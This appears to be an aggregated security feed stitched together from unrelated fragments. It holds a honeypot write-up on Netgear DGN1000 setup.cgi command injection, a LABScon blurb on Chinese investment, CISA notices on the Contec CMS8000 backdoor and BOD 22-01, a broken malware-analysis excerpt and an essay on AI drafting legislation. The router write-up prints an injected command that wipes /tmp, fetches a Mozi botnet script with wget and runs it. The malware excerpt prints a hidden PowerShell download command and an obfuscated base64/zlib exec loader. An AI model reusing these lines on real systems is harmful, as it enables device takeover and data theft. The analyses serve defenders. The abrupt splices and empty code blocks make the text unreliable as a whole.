&lt;p&gt;Looking into my Zeek logs to correlate this activity revealed an interesting payload, showing two examples of the command injection attempts here:&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/David_Watson_pic3.png" style="width: 600px; height: 104px;" /&gt;&lt;/p&gt;

&lt;p&gt;Breaking this down, we have:&lt;br /&gt;
&amp;nbsp;&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;GET /setup.cgi?next_file=netgear.cfg &amp;ndash; Targeting the setup.cgi script.&lt;/li&gt;
	&lt;li&gt;&amp;amp;todo=syscmd &amp;ndash; Calling the syscmd function.&lt;/li&gt;
	&lt;li&gt;&amp;amp;cmd=rm+-rf+/tmp/*;wget+hxxp[://]&amp;lt;ip_address:port&amp;gt;/Mozi[.]m+-O+/tmp/netgear;sh+netgear &amp;ndash; OS command injection.&lt;/li&gt;
	&lt;li&gt;&amp;amp;curpath=/ - Setting &amp;ldquo;current path&amp;rdquo; to root.&lt;/li&gt;
	&lt;li&gt;&amp;amp;currentsetting.htm=1 &amp;ndash; unclear exactly what this part does.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The command injection attempt aims to:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;rm -rf /tmp/*; - Remove the contents of the /tmp directory.&lt;/li&gt;
	&lt;li&gt;wget hxxp[://]&amp;lt;ip_address:port&amp;gt;/Mozi[.]m -O /tmp/netgear; - Retrieve malicious script (Mozi botnet related? [&lt;a href="https://thehackernews.com/2024/11/androxgh0st-malware-integrates-mozi.html"&gt;14&lt;/a&gt;]) from remote server, save it in /tmp directory and name it &amp;ldquo;netgear&amp;rdquo;.&lt;/li&gt;
	&lt;li&gt;sh netgear &amp;ndash; Execute malicious script on target device.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Reverse-Engineering setup.cgi&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Curiosity drove me to download a vulnerable version of the DGN1000 firmware, specifically version 1.1.00.24, still available right off the Netgear website! [&lt;a href="https://kb.netgear.com/2649/NETGEAR-Open-Source-Code-for-Programmers-GPL"&gt;8&lt;/a&gt;] I found the setup.cgi file, located in the &amp;lt;source&amp;gt;/target/sbin directory. Running the &amp;lsquo;file&amp;rsquo; command showed:&lt;/p&gt;

&lt;p&gt;&lt;span style="font-family: Courier New,Courier,monospace;"&gt;setup.cgi: ELF 32-bit MSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Using my relatively new reverse engineering &amp;ldquo;ninja&amp;rdquo; skills gained from several CTFs I have participated in over the last few years (and various websites with C documentation), I decided to attempt a disassembly with radare2, [&lt;a href="https://github.com/radareorg/radare2"&gt;10&lt;/a&gt;] as it allows me to look inside this compiled binary and see how it works.&lt;/p&gt;

&lt;p&gt;I am interested in the syscmd function, so I ran &amp;ldquo;iz~syscmd&amp;rdquo;, which gave me a string reference to syscmd and and a pointer to its location. Running &amp;ldquo;pdf&amp;rdquo; (print disassembly of function) after navigating to that address within the binary reveals the function associated with syscmd. Here is what that looks like:&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/David_Watson_pic4.png" style="width: 600px; height: 530px;" /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/David_Watson_pic5.png" style="width: 600px; height: 513px;" /&gt;&lt;/p&gt;

&lt;p&gt;Right off the bat, I can see some standard C library calls like putenv, printf, snprintf, chdir, puts, fflush, popen, fread, fwrite, and pclose. [&lt;a href="https://www.ibm.com/docs/en/i/7.5?topic=extensions-standard-c-library-functions-table-by-name"&gt;9&lt;/a&gt;] &amp;ldquo;find_val&amp;rdquo; might be a custom or proprietary function specific to the Netgear firmware, but I did not find any specific reference pointing to this as of now. Given the context of this disassembly, we will assume that find_val has something to do with retrieving user-supplied parameters. Based on the sequence of events here, this is what I can conclude from the syscmd function:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;putenv, puts, and printf have to do with setting up the environment, status messages and/or error reporting and/or debugging.[&lt;a href="https://www.ibm.com/docs/en/i/7.5?topic=extensions-standard-c-library-functions-table-by-name"&gt;9&lt;/a&gt;]&lt;/li&gt;
	&lt;li&gt;find_val most likely retrieves user-supplied parameters.&lt;/li&gt;
	&lt;li&gt;snprintf formats and stores characters into the buffer [9], likely from find_val.&lt;/li&gt;
	&lt;li&gt;chdir possibly relates to the curpath=/ in the HTTP request.&lt;/li&gt;
	&lt;li&gt;fflush writes the contents of the buffer to the output stream. [&lt;a href="https://www.ibm.com/docs/en/i/7.5?topic=extensions-standard-c-library-functions-table-by-name"&gt;9&lt;/a&gt;]&lt;/li&gt;
	&lt;li&gt;popen spawns a shell instance and executes the command. [&lt;a href="https://c-for-dummies.com/blog/?p=1418"&gt;11&lt;/a&gt;]&lt;/li&gt;
	&lt;li&gt;fread() and fwrite() capture the output and send it somewhere (log file and/or back to the user if necessary)[9]&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Based on what we can see how the syscmd function is laid out, there is absolutely zero input sanitization, and, looking at the entire setup.cgi script there is no mention of any authentication checks before being able to run these commands.&lt;/p&gt;

&lt;p&gt;As far as the netgear.cfg file goes, it is not entirely clear why there is a &amp;ldquo;next_file = netgear.cfg&amp;rdquo; parameter before the &amp;ldquo;&amp;amp;todo=syscmd&amp;hellip;etc&amp;rdquo; begins. I did not have access to the netgear.cfg file as it was a broken hard link pointing to the /tmp directory which was empty. I did find the &amp;ldquo;currentsetting.htm&amp;rdquo; file in source/target/www.eng, which, when printed, shows basic information about the device:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Firmware=V1.1.0.24NA&lt;/li&gt;
	&lt;li&gt;RegionTag=DGN1000_NA&lt;/li&gt;
	&lt;li&gt;Region=US&lt;/li&gt;
	&lt;li&gt;Model=DGN1000&lt;/li&gt;
	&lt;li&gt;InternetConnectionStatus=Up&lt;/li&gt;
	&lt;li&gt;ParentalControlSupported=1&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I also found something else interesting here. A file called syscmd.htm which has several interesting JavaScript functions in it relating to our exploit.&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/David_Watson_pic6.png" style="width: 600px; height: 462px;" /&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/David_Watson_pic7.png" style="width: 600px; height: 190px;" /&gt;&lt;/p&gt;

&lt;p&gt;Essentially this (combined with the rest of the script, not included here) looks like part of the local front-end of the router&amp;rsquo;s web page to facilitate running the user-initiated commands.&lt;/p&gt;

&lt;p&gt;This is interesting because there is at least some of the input validation/sanitization (included in some of the REGEX) we were looking for in the setup.cgi script itself! But this is only really enforced on the client/local side. There is nothing stopping an attacker from using this script to craft their own custom HTTP requests and sending them directly to the setup.cgi script in the provided format:&lt;/p&gt;

&lt;p&gt;&lt;span style="font-family: Courier New,Courier,monospace;"&gt;url: &amp;ldquo;/setup.cgi?todo=syscmd&amp;amp;cmd=&amp;lt;command_injection&amp;gt;&amp;amp;curpath=/&amp;rdquo;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;The only remaining parts to the full URL we mentioned are the &amp;ldquo;next_file=netgear.cfg&amp;rdquo; and &amp;ldquo;currentsetting.htm=1&amp;rdquo;. It is possible that these parameters need to be added to prevent the failure of the request/destination device throwing back errors, or perhaps one or both values have to do with the authentication bypass, as we did not see any checks for authentication in the setup.cgi script itself. It is also possible that the attackers are just re-using the proof of concept that was referenced on the exploit-db site,[2][3] showing the exact format of the exploit, and not personally crafting the request themselves, save for the remote server IP and the malicious files in question, used to add the router to a botnet and/or hijack CPU resources to mine cryptocurrency, as we have also seen in other attempts on my honeypot.&lt;/p&gt;

&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;The fact that we are still seeing what is now CVE-2024-12847 actively being exploited in the wild as much as it is isn&amp;rsquo;t all that surprising. Many people choose to keep their older hardware for as long as possible because, perhaps they cannot afford to replace it, and/or they do not realize the importance of patching regularly or upgrading when needed. Personally, I know VERY few people who check to see if their router needs updated firmware at least once a month. One of the potential benefits of using equipment provided by the Internet Service Provider(s) is they will often push these firmware updates to customer equipment, but that might not always be guaranteed, so it is worth double checking. And if the customer purchases their own equipment, it is their responsibility to keep it patched.&lt;br /&gt;
&amp;nbsp;&lt;br /&gt;
This graphic shows how many of these URLs the Internet Storm Center has seen over the past year: [&lt;a href="https://isc.sans.edu/weblogs/urlhistory.html?url=L3NldHVwLmNnaQ=="&gt;13&lt;/a&gt;]&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/David_Watson_pic8.png" style="width: 800px; height: 236px;" /&gt;&lt;/p&gt;

&lt;p&gt;What do we glean from this? Outdated systems remain vulnerable long after their official support has ended. Despite being labeled as &amp;ldquo;end of service&amp;rdquo;, devices like the Netgear DGN1000 and DGN2200v1 (and probably many more Internet of Things (IoT) devices) continue to present significant security risks that can and will be exploited if appropriate measures are not taken.&lt;/p&gt;

&lt;p&gt;My ultimate point in writing this is about the lessons I learned during this internship, in comprehensive network monitoring and data capture. Without the combination of detailed logging combined with things like packet captures and Zeek logs, these things can sometimes slip under the radar, leaving networks exposed. The ability to correlate events across different logs, as shown with Zeek in this case, was crucial in identifying and understanding the scope of the attack and understanding how to remediate and patch vulnerabilities.&lt;/p&gt;

&lt;p&gt;I read an article earlier today that gave me a chuckle, titled &amp;ldquo;I paid $250,000 to learn forensics&amp;hellip; and still don&amp;rsquo;t know forensics&amp;hellip; [&lt;a href="https://brettshavers.com/brett-s-blog/entry/i-paid-100-000-to-learn-forensics-and-still-dont-know-forensics"&gt;12&lt;/a&gt;]. Looking past the forensics title (and the humor), I think this applies to all of cybersecurity in general. Threats are constantly evolving, making this a field that demands continuous learning and adaptation. As soon as we become complacent, we risk failing to protect and defend our networks effectively. There is no definitive endpoint where we can say we &amp;ldquo;fully know&amp;rdquo; network security, threat hunting, incident response, etc. It is a lifelong journey, and one which I am extremely excited to be on. I will close this out with a phrase that has always stuck in my mind ever since my time in the Marines, and feel it is very applicable here. &amp;ldquo;Complacency kills&amp;rdquo; (and leaves networks vulnerable). One more thing, someone go buy Grandma a new router!&lt;/p&gt;

Elly Rostoum reveals why.</description><content:encoded>&lt;p&gt;&lt;span style="letter-spacing: 0px;"&gt;Chinese foreign direct investment should trigger American national security concerns, but much of it doesn’t. In this ‘behind closed doors’ talk at LABScon 24, Elly Rostoum reveals why and what can be done to improve our understanding of the influence of Chinese FDI.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Chinese foreign direct investment (FDI) enabled the technology revolution in China and set China as a strategic competitor to the United States. It opened new global markets, redrew trade routes, tapped into intellectual property, allowed for opportunities in industrial espionage, reshaped supply chains, and allowed for technological breakthroughs in genomics, quantum computing, artificial intelligence, and other critical and emerging technologies that are quite simply re-imagining the world.&lt;/p&gt;
&lt;p&gt;But who exactly owns the Chinese firms undertaking this FDI?&lt;/p&gt;
&lt;p&gt;The research presented by &lt;a href="https://www.labscon.io/speakers/elly-rostoum/" rel="noopener" target="_blank"&gt;Elly Rostoum&lt;/a&gt; in this LABScon 2024 keynote address tracks the incorporation structures and ownership of the 672 Chinese firms undertaking FDI globally.&lt;/p&gt;
&lt;p&gt;Taking the audience on a journey from how Chinese FDI triggers &amp;#8211; and sometimes fails to trigger &amp;#8211;  American national security concerns to the complex ownership structure of Chinese businesses operating within the U.S., Elly Rostoum reveals how the Chinese government has been able to evade American national security reviews by instrumentalizing investment through 3rd &amp;amp; 4th+ level subsidiaries, private equity, and holding companies.&lt;/p&gt;
&lt;p&gt;While much policy and attention has been focused on the investments of Chinese state-owned enterprises, Elly Rostoum argues that the real threat is “within” and buried in the details: seemingly “American” businesses that are ultimately owned by Chinese investment companies.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;

&lt;p&gt;CISA encourages users and administrators to review newly released ICS advisories for technical details and mitigations.&lt;/p&gt;</description><guid isPermaLink="false">/node/22937</guid></item><item><title>CISA Releases Fact Sheet Detailing Embedded Backdoor Function of Contec CMS8000 Firmware</title><link>https://www.cisa.gov/news-events/alerts/2025/01/30/cisa-releases-fact-sheet-detailing-embedded-backdoor-function-contec-cms8000-firmware</link><description>&lt;p&gt;CISA released a fact sheet, &lt;a href="https://www.cisa.gov/resources-tools/resources/contec-cms8000-contains-backdoor" title="Contec CMS8000 Contains a Backdoor"&gt;Contec CMS8000 Contains a Backdoor&lt;/a&gt;, detailing an analysis of three firmware package versions of the Contec CMS8000, a patient monitor used by the U.S. Healthcare and Public Health (HPH) sector. Analysts discovered that an embedded backdoor function with a hard-coded IP address, &lt;a href="https://cwe.mitre.org/data/definitions/912.html" title="CWE – 912: Hidden Functionality"&gt;CWE – 912: Hidden Functionality&lt;/a&gt; (&lt;a href="https://www.cve.org/CVERecord?id=CVE-2025-0626" title="CVE-2025-0626"&gt;CVE-2025-0626&lt;/a&gt;), and functionality that enables patient data spillage, &lt;a href="https://cwe.mitre.org/data/definitions/359.html" title="CWE-359: Exposure of Private Personal Information to an Unauthorized Actor"&gt;CWE – 359: Exposure of Private Personal Information to an Unauthorized Actor&lt;/a&gt; (&lt;a href="https://www.cve.org/CVERecord?id=CVE-2025-0683" title="CVE-2025-0683"&gt;CVE-2025-0683&lt;/a&gt;), exists in all versions analyzed.&lt;/p&gt;
&lt;p&gt;Please note the Contec CMS8000 may be re-labeled and sold by resellers. For a list of known re-labeled devices, please refer to FDA’s safety communication, &lt;a href="https://www.fda.gov/medical-devices/safety-communications/cybersecurity-vulnerabilities-certain-patient-monitors-contec-and-epsimed-fda-safety-communication" title="Cybersecurity Vulnerabilities with Certain Patient Monitors from Contec and Epsimed: FDA Safety Communication"&gt;Cybersecurity Vulnerabilities with Certain Patient Monitors from Contec and Epsimed: FDA Safety Communication&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Contec Medical Systems, the company which manufactures this monitor as well as other medical device and healthcare solutions, is headquartered in Qinhuangdao, China. The Contec CMS8000 is used in medical settings across the U.S. and European Union to provide continuous monitoring of a patient’s vital signs—tracking electrocardiogram, heart rate, blood oxygen saturation, non-invasive blood pressure, temperature, and respiration rate. CISA assesses that inclusion of this backdoor in the firmware of the patient monitor can create conditions which may allow remote code execution and device modification with the ability to alter its configuration. This introduces risk to patient safety as a malfunctioning patient monitor could lead to an improper response to patient vital signs.&lt;/p&gt;
&lt;p&gt;CISA strongly urges HPH sector organizations review the fact sheet and implement FDA's mitigations. Visit CISA’s &lt;a href="https://www.cisa.gov/topics/cybersecurity-best-practices/healthcare" title="Healthcare and Public Health Cybersecurity"&gt;Healthcare and Public Health Cybersecurity&lt;/a&gt; page to learn more about how to help improve cybersecurity within the HPH sector.

&lt;/ul&gt;
&lt;p&gt;These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.&lt;/p&gt;

BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the&lt;a&gt;&amp;nbsp;&lt;/a&gt;&lt;a href="https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf" title="BOD 22-01 Fact Sheet"&gt;BOD 22-01 Fact Sheet&lt;/a&gt;&amp;nbsp;for more information.&lt;/p&gt;
&lt;p&gt;Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Catalog vulnerabilities"&gt;Catalog vulnerabilities&lt;/a&gt;&amp;nbsp;as part of their vulnerability management practice.

powershell.exe -WindowStyle Hidden -Command &amp;quot;[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('hxxps://www[.]dropbox[.]com/scl/fi/30nkntkwjho3k60w7q3gu/Garmin_Campaign_Information_for_Partners_V5.docx?rlkey=k1zd9llfafqdqpb6be1rpqlmr&amp;amp;st=rxkezfgo&amp;amp;dl=1', '%TEMP%\\Garmin_Campaign_Information_for_Partners_V5.docx')&amp;quot;

&lt;/pre&gt;

&lt;p&gt;Then, it downloads a complete Python environment and unzips it on the victim's computer:&lt;/p&gt;

&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;

&lt;/pre&gt;

&lt;p&gt;The file &amp;quot;Document.zip&amp;quot; is pretty big (66MB) and contains a Python environment. Once installed, a Python script is launched:&lt;/p&gt;

&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;

&lt;p&gt;The file &amp;quot;ld_312.pd&amp;quot; is pretty simple and will execute a payload that has been compressed and Base64-encoded:&lt;/p&gt;

&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'PyiF59g///7z8X [...] yWzVVwJe'))&lt;/pre&gt;

&lt;p&gt;Once you deobfuscate this, you'll find another payload in reversed strings, compressed and Base64-encode. The funny part is that this technique has been implemented approximately 30(!) times. I stopped counting in Cyberchef. Finally, I got this code:&lt;/p&gt;

&lt;p&gt;The next payload is hidden in a fake SQLite database located in Document.zip. It's a classic InfoStealer that uses Telegram for exfiltration:&lt;/p&gt;

&lt;p&gt;Of course, these days, specific attention is paid to crypto wallets. Besides the classic data, this malware looks at many browser extensions:&lt;/p&gt;

&lt;p&gt;In fact, the use of AI by legislators is only likely to become more prevalent. There are currently projects in the US House, US Senate, and &lt;a href="https://www.popvox.org/blog/assessing-us-congressional-ai-adoption"&gt;legislatures around the world&lt;/a&gt; to trial the use of AI in various ways: searching databases, drafting text, summarizing meetings, performing policy research and analysis, and more. A Brazilian municipality &lt;a href="https://apnews.com/article/brazil-artificial-intelligence-porto-alegre-5afd1240afe7b6ac202bb0bbc45e08d4%E2%80%9D"&gt;passed the first known AI-written law&lt;/a&gt; in 2023.&lt;/p&gt;
&lt;p&gt;That&amp;#8217;s not surprising; AI is being used more everywhere. What is coming into focus is how policymakers will use AI and, critically, how this use will change the balance of power between the legislative and executive branches of government. Soon, US legislators may turn to AI to help them keep pace with the increasing complexity of their lawmaking&amp;#8212;and this will suppress the power and discretion of the executive branch to make policy.&lt;/p&gt;
&lt;h3&gt;Demand for Increasingly Complex Legislation&lt;/h3&gt;
&lt;p&gt;Legislators are writing increasingly long, intricate, and complicated laws that human legislative drafters have trouble producing. Already in the US, the &lt;a href="https://www.cambridge.org/core/journals/american-political-science-review/article/abs/lobbying-as-legislative-subsidy/AE4B5D8AB9C2487BB78C2A51BB53E03F"&gt;multibillion-dollar lobbying industry is subsidizing lawmakers&lt;/a&gt; in writing baroque laws: suggesting paragraphs to add to bills, specifying benefits for some, carving out exceptions for others. Indeed, the &lt;a href="https://www.oecd.org/en/publications/lobbying-in-the-21st-century_c6d8eff8-en.html"&gt;lobbying industry&lt;/a&gt; is growing in complexity and influence worldwide.&lt;/p&gt;
&lt;p&gt;Several years ago, &lt;a href="http://dx.doi.org/10.1177/1532673X18776628"&gt;researchers studied bills&lt;/a&gt; introduced into state legislatures throughout the US, looking at which bills were wholly original texts and which borrowed text from other states or from lobbyist-written model legislation. Their conclusion was not very surprising. Those who borrowed the most text were in legislatures that were less resourced. This makes sense: If you&amp;#8217;re a part-time legislator, perhaps unpaid and without a lot of staff, you need to rely on more external support to draft legislation. When the scope of policymaking outstrips the resources of legislators, they look for help. Today, that often means lobbyists, who provide expertise, research services, and drafting labor to legislators at the local, state, and federal levels at no charge. Of course, they are not unbiased: They seek to exert influence on behalf of their clients.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://doi.org/10.1086/714933"&gt;Ano&lt;/a&gt;&lt;a href="https://doi.org/10.1086/714933"&gt;ther study&lt;/a&gt;, at the US federal level, measured the complexity of policies proposed in legislation and tried to determine the factors that led to such growing complexity. While there are &lt;a href="https://core.ac.uk/download/pdf/217430499.pdf"&gt;numerous ways&lt;/a&gt; to measure legal complexity, these authors focused on the specificity of institutional design: How exacting is Congress in laying out the relational network of branches, agencies, and officials that will share power to implement the policy?&lt;/p&gt;
&lt;p&gt;In looking at bills enacted between 1993 and 2014, the researchers found two things. First, they concluded that ideological polarization drives complexity. The suggestion is that if a legislator is on the extreme end of the ideological spectrum, they&amp;#8217;re more likely to introduce a complex law that constrains the discretion of, as the authors put it, &amp;#8220;entrenched bureaucratic interests.&amp;#8221; And second, they found that divided government drives complexity to a large degree: Significant legislation passed under divided government was found to be 65 percent more complex than similar legislation passed under unified government. Their conclusion is that, if a legislator&amp;#8217;s party controls Congress, and the opposing party controls the White House, the legislator will want to give the executive as little wiggle room as possible. When legislators&amp;#8217; preferences disagree with the executive&amp;#8217;s, the legislature is incentivized to write laws that specify all the details. This gives the agency designated to implement the law as little discretion as possible.&lt;/p&gt;
&lt;p&gt;Because polarization and divided government are increasingly entrenched in the US, the demand for complex legislation at the federal level is likely to grow. Today, we have both the &lt;a href="https://www.pewresearch.org/short-reads/2022/03/10/the-polarization-in-todays-congress-has-roots-that-go-back-decades"&gt;greatest ideological polarization&lt;/a&gt; in Congress in living memory and an increasingly divided government at the federal level. Between 1900 and 1970 (57th through 90th Congresses), we had 27 instances of unified government and only seven divided; nearly a four-to-one ratio. Since then, the trend is roughly the opposite. As of the start of the next Congress, we will have had 20 divided governments and only eight unified (nearly a three-to-one ratio). And while the incoming Trump administration will see a unified government, the extremely closely divided House may often make this Congress look and feel like a divided one (see the &lt;a href="https://www.washingtonpost.com/politics/2024/12/21/trump-musk-shutdown-demands-defeat/"&gt;recent government shutdown crisis&lt;/a&gt; as an exemplar) and makes truly divided government a strong possibility in 2027.&lt;/p&gt;
&lt;p&gt;Another related factor driving the complexity of legislation is the need to do it all at once. The lobbyist &lt;a href="https://onlinelibrary.wiley.com/doi/full/10.1111/lsq.12266"&gt;feeding frenzy&lt;/a&gt;&amp;#8212;spurring major bills like the Affordable Care Act to be thousands of pages in length&amp;#8212;is driven in part by gridlock in Congress. &lt;a href="https://abcnews.go.com/Politics/118th-congress-track-become-productive-us-history/story?id=106254012"&gt;Congressional productivity has dropped so low&lt;/a&gt; that bills on any given policy issue seem like a once-in-a-generation opportunity for legislators&amp;#8212;and lobbyists&amp;#8212;to set policy.&lt;/p&gt;
&lt;p&gt;These dynamics also impact the states. States often have divided governments, &lt;a href="https://www.multistate.us/insider/2024/2/13/state-trifectas-hit-a-new-record-in-2024-only-10-states-have-divided-government"&gt;albeit less often than they used to&lt;/a&gt;, and their demand for drafting assistance is arguably higher due to their significantly smaller staffs. And since the &lt;a href="https://www.reuters.com/graphics/USA-CONGRESS/PRODUCTIVITY/egpbabmkwvq/"&gt;productivity of Congress has cratered&lt;/a&gt; in recent years, significantly more policymaking is happening at the state level.&lt;/p&gt;
&lt;p&gt;But there&amp;#8217;s another reason, particular to the US federal government, that will likely force congressional legislation to be more complex even during unified government. In June 2024, the &lt;a href="https://www.scotusblog.com/2024/06/supreme-court-strikes-down-chevron-curtailing-power-of-federal-agencies"&gt;US Supreme Court overturned the &lt;/a&gt;&lt;a href="https://www.scotusblog.com/2024/06/supreme-court-strikes-down-chevron-curtailing-power-of-federal-agencies"&gt;&lt;em&gt;Chevron&lt;/em&gt;&lt;/a&gt;&lt;a href="https://www.scotusblog.com/2024/06/supreme-court-strikes-down-chevron-curtailing-power-of-federal-agencies"&gt; doctrine&lt;/a&gt;, which gave executive agencies broad power to specify and implement legislation. Suddenly, there is &lt;a href="https://www.klgates.com/What-Overturning-Chevron-Means-for-the-Way-Congress-Does-Its-Business-7-18-2024"&gt;a mandate from the Supreme Court&lt;/a&gt; for more specific legislation. Issues that have historically been left implicitly to the executive branch are now required to be either explicitly delegated to agencies or specified directly in statute. Either way, the Court&amp;#8217;s ruling implied that law should become more complex and that Congress should increase its &lt;a href="https://bipartisanpolicy.org/blog/building-congress-for-post-chevron-world/"&gt;policymaking capacity&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This affects the balance of power between the executive and legislative branches of government. When the legislature delegates less to the executive branch, it increases its own power. Every decision made explicitly in statute is a decision the executive makes not on its own but, rather, according to the directive of the legislature. In the US system of &lt;a href="https://core.ac.uk/download/pdf/80562076.pdf"&gt;separation of powers&lt;/a&gt;, administrative law is a tool for balancing power among the legislative, executive, and judicial branches. The legislature gets to decide when to delegate and when not to, and it can respond to judicial review to adjust its delegation of control as needed. The elimination of &lt;em&gt;Chevron&lt;/em&gt; will induce the legislature to exert its control over delegation more robustly.&lt;/p&gt;
&lt;p&gt;At the same time, there are powerful political &lt;a href="https://goodauthority.org/news/abolishing-chevron-could-undermine-congress-scotus-loper"&gt;incentives for Congress to be vague&lt;/a&gt; and to rely on someone else, like agency bureaucrats, to make hard decisions. That empowers third parties&amp;#8212;the corporations, or lobbyists&amp;#8212;that have been gifted by the overturning of &lt;em&gt;Chevron&lt;/em&gt; a new tool in arguing against administrative regulations not specifically backed up by law. A &lt;a href="https://www.nytimes.com/2024/06/28/us/politics/supreme-court-regulatory-agencies.html"&gt;continuing stream of Supreme Court decisions&lt;/a&gt; handing victories to unpopular industries could be another driver of complex law, adding political pressure to pass legislative fixes.&lt;/p&gt;
&lt;h3&gt;AI Can Supply Complex Legislation&lt;/h3&gt;
&lt;p&gt;Congress may or may not be up to the challenge of putting more policy details into law, but the external forces outlined above&amp;#8212;lobbyists, the judiciary, and an increasingly divided and polarized government&amp;#8212;are pushing them to do so. When Congress does take on the task of writing complex legislation, it&amp;#8217;s quite likely it will turn to AI for help.&lt;/p&gt;
&lt;p&gt;Two particular AI capabilities enable Congress to write laws different from laws humans tend to write. One, AI models have an enormous &lt;em&gt;scope&lt;/em&gt; of expertise, whereas people have only a handful of specializations. Large language models (LLMs) like the one powering ChatGPT can generate legislative text on funding specialty crop harvesting mechanization equally as well as material on energy efficiency standards for street lighting. This enables a legislator to address more topics simultaneously. Two, AI models have the &lt;em&gt;sophistication&lt;/em&gt; to work with a higher degree of complexity than people can. Modern LLM systems can instantaneously perform &lt;a href="https://arxiv.org/pdf/2411.05000"&gt;several simultaneous multistep reasoning tasks&lt;/a&gt; using information from thousands of pages of documents. This enables a legislator to fill in more baroque detail on any given topic.&lt;/p&gt;
&lt;p&gt;That&amp;#8217;s not to say that handing over legislative drafting to machines is easily done. Modernizing &lt;a href="https://www.recodingamerica.us"&gt;any institutional process is extremely hard&lt;/a&gt;, even when the technology is readily available and performant. And &lt;a href="https://proceedings.neurips.cc/paper_files/paper/2023/file/89e44582fd28ddfea1ea4dcb0ebbf4b0-Paper-Datasets_and_Benchmarks.pdf"&gt;modern AI still has a ways to go&lt;/a&gt; to achieve mastery of complex legal and policy issues. But the basic tools are there.&lt;/p&gt;
&lt;p&gt;AI can be used in each step of lawmaking, and this will bring various benefits to policymakers. It could let them work on more policies&amp;#8212;more bills&amp;#8212;at the same time, add more detail and specificity to each bill, or interpret and &lt;a href="https://static.ie.edu/CGC/AI4D%20Paper%203%20Applications%20of%20Artificial%20Intelligence%20Tools%20to%20Engance%20Legislative%20Engagement.pdf"&gt;incorporate more feedback from constituents&lt;/a&gt; and outside groups. The addition of a single AI tool to a legislative office may have an impact similar to adding several people to their staff, but with far lower cost.&lt;/p&gt;
&lt;p&gt;Speed sometimes matters when writing law. When there is a change of governing party, there is often a rush to change as much policy as possible to match the platform of the new regime. AI could help legislators do that kind of wholesale revision. The result could be policy that is more responsive to voters&amp;#8212;or more political instability. Already in 2024, the US House&amp;#8217;s &lt;a href="https://cha.house.gov/_cache/files/7/5/75fda5da-b1e4-4990-a543-6ca495f983ef/CD88E4BBA4CE5ABDD53A31C31931168B.cha-modernization-ai-flash-report-07-30-24-51-.pdf"&gt;Office of the Clerk has begun using AI&lt;/a&gt; to speed up the process of producing cost estimates for bills and understanding how new legislation relates to existing code. &lt;a href="https://search-prod.lis.state.oh.us/api/v2/general_assembly_135/committees/cmte_s_govt_1/meetings/cmte_s_govt_1_2024-05-22-1030_1242/submissions/olr_testimony_csi.pdf"&gt;Ohio has used an AI tool&lt;/a&gt; to do wholesale revision of state administrative law since 2020.&lt;/p&gt;
&lt;p&gt;AI can also make laws clearer and more consistent. With their superhuman attention spans, AI tools are good at enforcing syntactic and grammatical rules. They will be effective at drafting text in precise and proper legislative language, or offering detailed feedback to human drafters. Borrowing ideas from software development, where coders use tools to identify common instances of bad programming practices, an AI reviewer can &lt;a href="https://link.springer.com/article/10.1007/s10506-022-09315-w"&gt;highlight bad law-writing practices&lt;/a&gt;. For example, it can detect when significant phrasing is inconsistent across a long bill. If a bill about insurance repeatedly lists a variety of disaster categories, but leaves one out one time, AI can catch that.&lt;/p&gt;
&lt;p&gt;Perhaps this seems like minutiae, but a small ambiguity or mistake in law can have massive consequences. In 2015, the Affordable Care Act came close to being struck down &lt;a href="https://www.nytimes.com/2015/05/26/us/politics/contested-words-in-affordable-care-act-may-have-been-left-by-mistake.html"&gt;because of a typo in four words&lt;/a&gt;, imperiling health care services extended to more than 7 million Americans.&lt;/p&gt;
